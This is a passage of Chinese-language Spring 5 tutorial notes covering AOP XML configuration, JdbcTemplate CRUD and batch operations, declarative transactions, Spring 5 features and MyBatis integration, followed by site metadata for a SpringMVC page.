开启注解扫描\n@enableaspectjautoproxy(proxytargetclass = true)  // 开启配置aop对象\npublic class springconfig {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> tips: 当程序运行抛出异常时，afterthrowing、after存在，afterreturning不存在。\n\n\n# 基于xml方式配置\n\n 1. 创建增强类、增强方法、被增强类、被增强方法\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * 增强类\n */\npublic class bookproxy {\n    /**\n     * 增强方法\n     */\n    public void before(){\n        system.out.println("before.....");\n    }\n}\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * 被增强类\n */\npublic class book {\n    /**\n     * 被增强方法\n     */\n    public void buy(){\n        system.out.println("buy .....");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. 编写spring配置文件\n\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xmlns:aop="http://www.springframework.org/schema/aop"\n     xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                      http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                      http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n\n  <bean id="book" class="com.pwddd.spring5aop.aopxml.book" />\n  <bean id="bookproxy" class="com.pwddd.spring5aop.aopxml.bookproxy" />\n\n\x3c!--    // 配置切入点--\x3e\n  <aop:config>\n      <aop:pointcut id="buy" expression="execution(* com.pwddd.spring5aop.aopxml.book.buy(..))"/>\n      <aop:aspect ref="bookproxy">\n          <aop:before method="before" pointcut-ref="buy" />\n      </aop:aspect>\n  </aop:config>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# jdbctemplate\n\n\n# 概述\n\nspring 框架对 jdbc 进行封装，使用 jdbctemplate 方便实现对数据库操作。\n\n\n# 准备工作\n\n 1. 导入相关jar包\n\n\n\n 2. 配置spring配置文件，开启注解扫描、配置数据源、配置jdbctemplate对象。\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                    http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n\x3c!--    开启注解扫描--\x3e\n    <context:component-scan base-package="com.pwddd.spring5.jdbc" />\n\x3c!--    导入配置文件--\x3e\n    <context:property-placeholder location="classpath:jdbc.properties" />\n\x3c!--    配置数据源--\x3e\n    <bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n        <property name="url" value="${jdbc.url}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="driverclassname" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n\x3c!--    配置jdbctemplate--\x3e\n    <bean id="jdbctemplate" class="org.springframework.jdbc.core.jdbctemplate">\n        <property name="datasource" ref="datasource" />\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 3. 编写相关业务方法\n\nservice\n\npackage com.pwddd.spring5.jdbc.service.impl;\n\nimport com.pwddd.spring5.jdbc.dao.bookdao;\nimport com.pwddd.spring5.jdbc.service.bookservice;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.component;\n\n@component\npublic class bookserviceimpl implements bookservice {\n\t@autowired\n\tprivate bookdao bookdao;\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\ndao\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.bookdao;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.stereotype.component;\n\n@component\npublic class bookdaoimpl implements bookdao {\n\t@autowired\n\tprivate jdbctemplate jdbctemplate;\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 4. 编写测试方法\n\npackage com.pwddd.spring5.jdbc.test;\n\nimport com.pwddd.spring5.jdbc.service.bookservice;\nimport org.junit.test;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.context.support.classpathxmlapplicationcontext;\n\npublic class testjdbc {\n\n@test\npublic void testjdbc(){\n\tapplicationcontext applicationcontext =\n\t\t\tnew classpathxmlapplicationcontext("bean1.xml");\n\tbookservice bookserviceimpl = applicationcontext.getbean("bookserviceimpl", bookservice.class);\n\tsystem.out.println(bookserviceimpl);\n}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# crud\n\n# cud\n\n在进行增删改操作，调用jdbctemplate的update方法进行。\n\n\n\n该方法有两个参数，第一个为sql语句、第二个为可变参数。 测试代码：\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.bookdao;\nimport com.pwddd.spring5.jdbc.entity.book;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.stereotype.component;\n\n@component\npublic class bookdaoimpl implements bookdao {\n    @autowired\n    private jdbctemplate jdbctemplate;\n\n    @override\n    public int add(book book) {\n        string sql = "insert into book values(?,?,?)";\n        object[] args = {book.getbookid(),book.getbookname(),book.getbookauthor()};\n        return jdbctemplate.update(sql,args);\n    }\n\n    @override\n    public int deletebookbyid(string id) {\n        string sql = "delete from book where bookid=?";\n        object[] args = {id};\n        return jdbctemplate.update(sql,args);\n    }\n\n    @override\n    public int updatebookinfo(book book) {\n        string sql = "update book set bookname=?,bookauthor=? where bookid=?";\n        object[] args = {book.getbookname(),book.getbookauthor(),book.getbookid()};\n        return jdbctemplate.update(sql,args);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# r\n\njdbctemplate查询总共分为三种情况：\n\n * 使用聚合函数查询单个值\n * 查询单条记录信息\n * 查询列表\n\n# 单值查询\n\n单值查询是利用sql语句的聚合函数如count查询单个字段。使用如下方法进行查询：\n\n\n\n该方法共两个参数，第一个为sql语句，第二个参数为返回值的类型。 实例代码：\n\n@override\npublic int querybooknum() {\n    string sql = "select count(*) from book";\n    integer integer = jdbctemplate.queryforobject(sql, integer.class);\n    return integer;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 单条记录查询\n\n单条记录查询的结果对应一个实体类。使用如下的方法进行查询：\n\n\n\n该方法有三个参数：\n\n * sql语句\n * rowmapper 是接口，针对返回不同类型数据，使用这个接口里面实现类完成数据封装\n * 可变的sql语句参数。\n\n实例代码：\n\n@override\npublic book querybookbyid(string id) {\n    string sql = "select * from book where bookid=?";\n    book book = jdbctemplate.queryforobject(sql, new beanpropertyrowmapper<book>(book.class), id);\n    return book;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 集合查询\n\n集合查询的查询结果是一个集合，使用如下的方法进行查询：\n\n\n\n该方法的参数类似单条记录查询。\n\n实例代码：\n\n@override\npublic list<book> queryallbook() {\n    string sql = "select * from book";\n    list<book> books = jdbctemplate.query(sql, new beanpropertyrowmapper<book>(book.class));\n    return books;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 批量操作\n\n以上的方法都只能单次处理单条数据，往往遇到需要批量处理数据库数据的需求，上面的方法就力不从心了。jdbctemplate也提供了数据库批量操作的方法。\n\n\n\n该方法的参数和上面增删改的操作方法相似，只是可变参数换成了object数组的list集合，单个object数组对应数据库中的一个记录。\n\n实例代码：\n\n@override\npublic void batchdelete(list<object[]> args) {\n    string sql = "delete from book where bookid=?";\n    jdbctemplate.batchupdate(sql,args);\n}\n\n@override\npublic void batchupdate(list<object[]> args) {\n    string sql = "update book set bookname=?,bookauthor=? where bookid=?";\n    jdbctemplate.batchupdate(sql,args);\n}\n\n@override\npublic void batchadd(list<object[]> args) {\n    string sql = "insert into book values(?,?,?)";\n    jdbctemplate.batchupdate(sql,args);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n测试代码：\n\n@test\npublic void batch(){\n    list<object[]> addargs = new arraylist<>();\n    object[] o1 = {"100","test100","a100"};\n    object[] o2 = {"200","test200","a200"};\n    object[] o3 = {"300","test300","a300"};\n    addargs.add(o1);\n    addargs.add(o2);\n    addargs.add(o3);\n//        bookserviceimpl.batchadd(addargs);\n    list<object[]> updateargs = new arraylist<>();\n    object[] ou1 = {"test100","a100","100"};\n    object[] ou2 = {"test200","a200","200"};\n    object[] ou3 = {"test300","a300","300"};\n    updateargs.add(ou1);\n    updateargs.add(ou2);\n    updateargs.add(ou3);\n    bookserviceimpl.batchupdate(updateargs);\n    list<object[]> delargs = new arraylist<>();\n    object[] od1 = {"100"};\n    object[] od2 = {"300"};\n    delargs.add(od1);\n    delargs.add(od2);\n    bookserviceimpl.batchdelete(delargs);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 事务\n\n\n# 概念\n\n事务是数据库操作最基本单元，逻辑上一组操作，要么都成功，如果有一个失败所有操作都失败。典型的业务场景就是转账，lucy 转账 100 元 给 mary，lucy 少 100，mary 多 100\n\n事务有四个特性：\n\n * 原子性\n * 一致性\n * 隔离性\n * 持久性\n\n\n# 测试代码\n\n模拟上述的转账的例子\n\n 1. 创建dao\n\npackage com.pwddd.dao.impl;\n\nimport com.pwddd.dao.userdao;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.stereotype.repository;\n\n@repository\npublic class userdaoimpl implements userdao {\n    @autowired\n    private jdbctemplate jdbctemplate;\n\n    @override\n    public void reducemoney() {\n        string sql = "update bank set money=money-100 where id=1";\n        jdbctemplate.update(sql);\n    }\n\n    @override\n    public void addmoney() {\n        string sql = "update bank set money=money+100 where id=2";\n        jdbctemplate.update(sql);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n 2. 创建service\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.userdao;\nimport com.pwddd.service.userservice;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.service;\n\n@service\npublic class userserviceimpl implements userservice {\n    @autowired\n    private userdao userdao;\n\n    @override\n    public void accountmoney() {\n        userdao.reducemoney();\n\n        int i = 1/0;\n        userdao.addmoney();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n如果没有事务，则当少钱之后报错，没有多钱，就会导致不一致的情况。\n\n\n# 事务的操作过程\n\n事务添加到 javaee 三层结构里面 service 层（业务逻辑层） 在 spring 进行事务管理操作有两种方式：\n\n * 编程式事务管理\n * 声明式事务管理（使用）\n\n编程式事务管理如图：\n\n\n\n声明式事务管理有两种实现方式：\n\n * 基于注解的实现\n * 基于xml的实现\n\n在 spring 进行声明式事务管理，底层使用 aop 原理，spring 事务管理 api 提供一个接口，代表事务管理器，这个接口针对不同的框架提供不同的实现类。\n\n\n\n\n# 基于注解方式的事务管理\n\n完全注解开发的方式进行事务管理：\n\npackage com.pwddd.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.componentscan;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.jdbc.datasource.datasourcetransactionmanager;\nimport org.springframework.transaction.transactionmanager;\nimport org.springframework.transaction.annotation.enabletransactionmanagement;\n\nimport javax.sql.datasource;\n\n@configuration\n@componentscan(basepackages = "com.pwddd")\n@enabletransactionmanagement  // 开启事务\npublic class springconfig {\n\n    @bean\n    public druiddatasource getdatasource(){\n        druiddatasource druiddatasource = new druiddatasource();\n        druiddatasource.seturl("jdbc:mysql://localhost:3306/srping5test");\n        druiddatasource.setdriverclassname("com.mysql.jdbc.driver");\n        druiddatasource.setusername("root");\n        druiddatasource.setpassword("123456");\n        return druiddatasource;\n    }\n\n    @bean\n    public jdbctemplate getjdbctemplete(druiddatasource datasource){\n        jdbctemplate jdbctemplate = new jdbctemplate();\n        jdbctemplate.setdatasource(datasource);\n        return jdbctemplate;\n    }\n\n    @bean\n    public transactionmanager gettransactionmanager(datasource datasource){\n        datasourcetransactionmanager datasourcetransactionmanager = new datasourcetransactionmanager();\n        datasourcetransactionmanager.setdatasource(datasource);\n        return datasourcetransactionmanager;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n在想要进行事务的类或者方法上添加注解\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.userdao;\nimport com.pwddd.service.userservice;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.service;\nimport org.springframework.transaction.annotation.transactional;\n\n@service\n@transactional(propagation = propagation.required,isolation = isolation.repeatable_read)\npublic class userserviceimpl implements userservice {\n    @autowired\n    private userdao userdao;\n\n    @override\n    public void accountmoney() {\n        userdao.reducemoney();\n\n        int i = 1/0;\n        userdao.addmoney();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 注解相关参数解释\n\n在 service 类上面添加注解@transactional，在这个注解里面可以配置事务相关参数。\n\n\n\n# propagation：事务传播行为\n\n\n\n\n\n# ioslation：事务隔离级别\n\n事务有特性成为隔离性，多事务操作之间不会产生影响。不考虑隔离性产生很多问题。在隔离性中常见的三个问题是：脏读、不可重复读、虚（幻）读。\n\n 1. 脏读：一个未提交事务读取到另一个未提交事务的数据\n\n\n\n 2. 不可重复读：一个未提交事务读取到另一提交事务修改数据\n\n\n\n 3. 虚读：一个未提交事务读取到另一提交事务添加数据\n\n解决以上问题，可以配置注解的相关参数。\n\n\n\n# timeout：超时时间\n\n事务需要在一定时间内进行提交，如果不提交进行回滚。默认值是 -1 ，设置时间以秒单位进行计算。\n\n# readonly：是否只读\n\n读：查询操作，写：添加修改删除操作，readonly 默认值 false，表示可以查询，可以添加修改删除操作。设置 readonly 值是 true，设置成 true 之后，只能查询。\n\n# rollbackfor：回滚\n\n设置出现哪些异常进行事务回滚\n\n# norollbackfor：不回滚\n\n设置出现哪些异常不进行事务回滚\n\n\n# 基于xml配置事务\n\n示例代码：\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:tx="http://www.springframework.org/schema/tx"\n       xmlns:aop="http://www.springframework.org/schema/aop"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\n                http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n    <context:component-scan base-package="com.pwddd" />\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n        <property name="driverclassname" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="url" value="${jdbc.url}" />\n    </bean>\n    <bean id="transcationmanager" class="org.springframework.jdbc.datasource.datasourcetransactionmanager">\n        <property name="datasource" ref="datasource" />\n    </bean>\n\n    <tx:advice id="txadvice">\n        <tx:attributes>\n            <tx:method name="accountmoney" propagation="required"/>\n        </tx:attributes>\n    </tx:advice>\n\n    <aop:config>\n        <aop:pointcut id="pt" expression="execution(* com.pwddd.service.impl.userserviceimpl.*(..))"/>\n        <aop:advisor advice-ref="txadvice" pointcut-ref="pt" />\n    </aop:config>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# spring5新特性\n\n\n# 概述\n\n> 整个 spring5 框架的代码基于 java8，运行时兼容 jdk9，许多不建议使用的类和方 法在代码库中删除\n\n\n# 整合日志框架\n\nspring 5.0 框架自带了通用的日志封装。并且已经移除 log4jconfiglistener，官方建议使用 log4j2。\n\n 1. 导入jar包\n\n\n\n 2. 创建log4j2.xml文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<configuration status="debug">\n    <appenders>\n        <console name="console" target="system_out">\n            <patternlayout pattern="%d{hh:mm:ss.sss} [%t] %-5level %logger{36} - %msg%n"/>\n        </console>\n    </appenders>\n    <loggers>\n        <root level="error">\n            <appenderref ref="console"/>\n        </root>\n    </loggers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# nullable注解\n\n@nullable 注解可以使用在方法上面，属性上面，参数上面。表示方法返回可以为空，属性值可以 为空，参数值可以为空注解。\n\n\n# 核心容器支持函数式风格\n\n实例代码：\n\n@test\n    public void testgenericapplicationcontext() {\n        //1 创建 genericapplicationcontext 对象\n        genericapplicationcontext context = new genericapplicationcontext();\n        //2 调用 context 的方法对象注册\n        context.refresh();\n        context.registerbean("user1",user.class,() -> new user());\n        //3 获取在 spring 注册的对象\n        // user user = (user)context.getbean("com.atguigu.spring5.test.user");\n        user user = (user)context.getbean("user1");\n        system.out.println(user);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 支持整合junit5\n\n 1. 引入spring test的依赖包\n\n 2. 编写junit4测试类\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.springconfig;\nimport com.pwddd.spring5new.service.userservice;\nimport org.junit.test;\nimport org.junit.runner.runwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit4.springjunit4classrunner;\n\n@runwith(springjunit4classrunner.class)\n@contextconfiguration(classes = springconfig.class)\npublic class testjunit {\n    @autowired\n    private userservice userservice;\n\n    @test\n    public void testadd(){\n        userservice.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 3. 整合junit5\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.springconfig;\nimport com.pwddd.spring5new.service.userservice;\nimport org.junit.jupiter.api.test;\nimport org.junit.jupiter.api.extension.extendwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit.jupiter.springextension;\n\n@extendwith(springextension.class)\n@contextconfiguration(classes = springconfig.class)\npublic class testjunit5 {\n    @autowired\n    private userservice userservice;\n    @test\n    public void test(){\n        userservice.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n 4. 使用一个注解代替上面的两个注解\n\n//@extendwith(springextension.class)\n//@contextconfiguration(classes = springconfig.class)\n@springjunitconfig(classes = springconfig.class)\n\n\n1\n2\n3\n\n\n\n# springwebflux\n\n前置知识：springmvc、java8新特性、springboot\n\n#todo\n\n\n# spring整合mybatis\n\n目前我们开发功能的流程中，在service层会手动创建sqlsession对象，并使用sqlsession对象获取mapper接口的实例化对象，但是我们真正使用的是mapper接口的对象，目前的代码编写方式极大的影响了开发效率，而且mybatis层和service层之间的耦合性非常高。 使用springioc技术实现service层和mybatis层的解耦：让spring容器帮我们获取mapper层接口的实例化 对象，我们直接从spring容器中获取使用即可。 在业务层使用spring容器对象获取mapper接口实例化对象后，实现了service层和mybatis层的解耦，但是在controller层我们依然在servlet中直接创建service对象，耦合性过高。 将service对象配置为bean对象，servlet中从spring容器中，获取service对象，完成功能开发。同时传统的获取spring容器的方法写在每个servlet的service方法中，假设每个请求调用service都要创建一个servlet，那么就会造成容器的资源浪费。\n\n分别配置数据源，sqlsessionfactory，扫描mapper\n\n<bean class="org.springframework.jdbc.datasource.drivermanagerdatasource" id="datasource">\n<property name="url" value="jdbc:mysql://localhost:3306/test?characterencoding=utf8&usessl=false&servertimezone=asia/shanghai"/>\n<property name="driverclassname" value="com.mysql.jdbc.driver" />\n<property name="username" value="root" />\n<property name="password" value="123456" />\n</bean>\n\n\x3c!--    配置sqlsessionfactory--\x3e\n<bean class="org.mybatis.spring.sqlsessionfactorybean" id="factory">\n<property name="datasource" ref="datasource" />\n</bean>\n\n\x3c!--    配置扫描mapper--\x3e\n<bean class="org.mybatis.spring.mapper.mapperscannerconfigurer" id="mapperscanner">\n<property name="sqlsessionfactory"  ref="factory"/>\n<property name="basepackage" value="pers.jm.mapper"/>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n配置service层bean service层需要调用mapper层的方法，因此在service中需要mapper层的对象。在service层中声明mapper层的引用，并为之创建getset方法。\n\nusermapper usermapper;\n\n  public usermapper getusermapper() {\n      return usermapper;\n  }\n\n  public void setusermapper(usermapper usermapper) {\n      this.usermapper = usermapper;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n之后配置service层的bean,添加自动扫描mapper类的对象引用\n\n<bean class="pers.jm.service.userserviceimpl" id="userservice">\n    <property name="usermapper" ref="usermapper" />\n</bean>\n\n\n1\n2\n3\n\n\n在web.xml加载spring的配置文件并设置监听器\n\n<context-param>\n    <param-name>contextconfiglocation</param-name>\x3c!--键名--\x3e\n    <param-value>classpath:applicationcontext.xml</param-value>\x3c!--值--\x3e\n  </context-param>\n  <listener>\n    <listener-class>\n      org.springframework.web.context.contextloaderlistener\n    </listener-class>\n  </listener>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n在servlet的init方法中，获取对象\n\nuserservice userservice;\n@override\npublic void init() throws servletexception {\n    webapplicationcontext webapplicationcontext = webapplicationcontextutils.getwebapplicationcontext(this.getservletcontext());\n    userservice = (userservice) webapplicationcontext.getbean("userservice");\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n至此，servlet → service → mapper 依赖配置完成\n\n当服务器启动时，通过web.xml中配置的监听器，加载spring的配置文件，spring配置文件加载后，设置mybatis的数据源，sqlsession等并扫描创建对应的mapper对象。mapper对象创建后，根据配置创建service的对象，service对象中注入mapper层的对象引用。因此servlet获取service对象，实际上获取的是 有mapper引用的service层对象。',charsets:{cjk:!0},lastUpdated:"2022/05/16, 15:55:31",lastUpdatedTimestamp:1652716531e3},{title:"SpringMVC",frontmatter:{title:"SpringMVC",date:"2022-01-06T00:00:00.000Z",permalink:"/dev/java/core/springmvc",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务核心"],tags:["SSM","SpringMVC"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/01.SpringMVC.html",relativePath:"01.开发/101.后端/1011.微服务核心/01.SpringMVC.md",key:"v-3ddfa200",path:"/dev/java/core/springmvc/",headers:[{level:2,title:"SpringMVC简介",slug:"springmvc简介",normalizedTitle:"springmvc简介",charIndex:16},{level:3,title:"什么是MVC",slug:"什么是mvc",normalizedTitle:"什么是mvc",charIndex:32},{level:3,title:"什么是SpringMVC",slug:"什么是springmvc",normalizedTitle:"什么是springmvc",charIndex:451},{level:3,title:"SpringMVC的特点",slug:"springmvc的特点",normalizedTitle:"springmvc的特点",charIndex:689},{level:2,title:"MVC开发环境搭建",slug:"mvc开发环境搭建",normalizedTitle:"mvc开发环境搭建",charIndex:921},{level:3,title:"Maven项目创建",slug:"maven项目创建",normalizedTitle:"maven项目创建",charIndex:935},{level:3,title:"Web.xml配置文件",slug:"web-xml配置文件",normalizedTitle:"web.xml配置文件",charIndex:1872},{level:3,title:"创建请求控制器",slug:"创建请求控制器",normalizedTitle:"创建请求控制器",charIndex:3802},{level:3,title:"创建SpringMVC配置文件",slug:"创建springmvc配置文件",normalizedTitle:"创建springmvc配置文件",charIndex:4069},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:5718},{level:3,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:6374},{level:2,title:"RequestMapping注解",slug:"requestmapping注解",normalizedTitle:"requestmapping注解",charIndex:5757},{level:3,title:"@RequestMapping注解的功能",slug:"requestmapping注解的功能",normalizedTitle:"@requestmapping注解的功能",charIndex:6659},{level:3,title:"@RequestMapping注解的位置",slug:"requestmapping注解的位置",normalizedTitle:"@requestmapping注解的位置",charIndex:6794},{level:3,title:"@RequestMapping注解的value属性",slug:"requestmapping注解的value属性",normalizedTitle:"@requestmapping注解的value属性",charIndex:5795},{level:3,title:"@RequestMapping注解的method属性",slug:"requestmapping注解的method属性",normalizedTitle:"@requestmapping注解的method属性",charIndex:7643},{level:3,title:"@RequestMapping注解的params属性",slug:"requestmapping注解的params属性",normalizedTitle:"@requestmapping注解的params属性",charIndex:8524},{level:3,title:"@RequestMapping注解的headers属性",slug:"requestmapping注解的headers属性",normalizedTitle:"@requestmapping注解的headers属性",charIndex:9295},{level:3,title:"SpringMVC支持ant风格的路径",slug:"springmvc支持ant风格的路径",normalizedTitle:"springmvc支持ant风格的路径",charIndex:9709},{level:3,title:"SpringMVC支持路径中的占位符",slug:"springmvc支持路径中的占位符",normalizedTitle:"springmvc支持路径中的占位符",charIndex:9805},{level:2,title:"SpringMVC获取请求参数",slug:"springmvc获取请求参数",normalizedTitle:"springmvc获取请求参数",charIndex:10378},{level:3,title:"通过ServletAPI获取",slug:"通过servletapi获取",normalizedTitle:"通过servletapi获取",charIndex:10398},{level:3,title:"通过控制器方法的形参获取请求参数",slug:"通过控制器方法的形参获取请求参数",normalizedTitle:"通过控制器方法的形参获取请求参数",charIndex:10954},{level:3,title:"@RequestParam",slug:"requestparam",normalizedTitle:"@requestparam",charIndex:11533},{level:3,title:"@RequestHeader",slug:"requestheader",normalizedTitle:"@requestheader",charIndex:11941},{level:3,title:"@CookieValue",slug:"cookievalue",normalizedTitle:"@cookievalue",charIndex:12067},{level:3,title:"通过POJO获取请求参数",slug:"通过pojo获取请求参数",normalizedTitle:"通过pojo获取请求参数",charIndex:12190},{level:3,title:"解决获取请求参数的乱码问题",slug:"解决获取请求参数的乱码问题",normalizedTitle:"解决获取请求参数的乱码问题",charIndex:12828},{level:2,title:"域对象共享数据",slug:"域对象共享数据",normalizedTitle:"域对象共享数据",charIndex:13476},{level:3,title:"使用ServletAPI向request域对象共享数据",slug:"使用servletapi向request域对象共享数据",normalizedTitle:"使用servletapi向request域对象共享数据",charIndex:13488},{level:3,title:"使用ModelAndView向request域对象共享数据",slug:"使用modelandview向request域对象共享数据",normalizedTitle:"使用modelandview向request域对象共享数据",charIndex:13711},{level:3,title:"使用Model向request域对象共享数据",slug:"使用model向request域对象共享数据",normalizedTitle:"使用model向request域对象共享数据",charIndex:14022},{level:3,title:"使用map向request域对象共享数据",slug:"使用map向request域对象共享数据",normalizedTitle:"使用map向request域对象共享数据",charIndex:14215},{level:3,title:"使用ModelMap向request域对象共享数据",slug:"使用modelmap向request域对象共享数据",normalizedTitle:"使用modelmap向request域对象共享数据",charIndex:14395},{level:3,title:"Model、ModelMap、Map的关系",slug:"model、modelmap、map的关系",normalizedTitle:"model、modelmap、map的关系",charIndex:14593},{level:3,title:"session域共享数据",slug:"session域共享数据",normalizedTitle:"session域共享数据",charIndex:14905},{level:3,title:"application域共享数据",slug:"application域共享数据",normalizedTitle:"application域共享数据",charIndex:15143},{level:2,title:"SpringMVC的视图",slug:"springmvc的视图",normalizedTitle:"springmvc的视图",charIndex:15474},{level:3,title:"ThymeleafView",slug:"thymeleafview",normalizedTitle:"thymeleafview",charIndex:4754},{level:3,title:"转发视图",slug:"转发视图",normalizedTitle:"转发视图",charIndex:15557},{level:3,title:"重定向视图",slug:"重定向视图",normalizedTitle:"重定向视图",charIndex:15562},{level:3,title:"视图控制器view-controller",slug:"视图控制器view-controller",normalizedTitle:"视图控制器view-controller",charIndex:16625},{level:2,title:"RESTful",slug:"restful",normalizedTitle:"restful",charIndex:8506},{level:3,title:"RESTful简介",slug:"restful简介",normalizedTitle:"restful简介",charIndex:17e3},{level:3,title:"RESTful的实现",slug:"restful的实现",normalizedTitle:"restful的实现",charIndex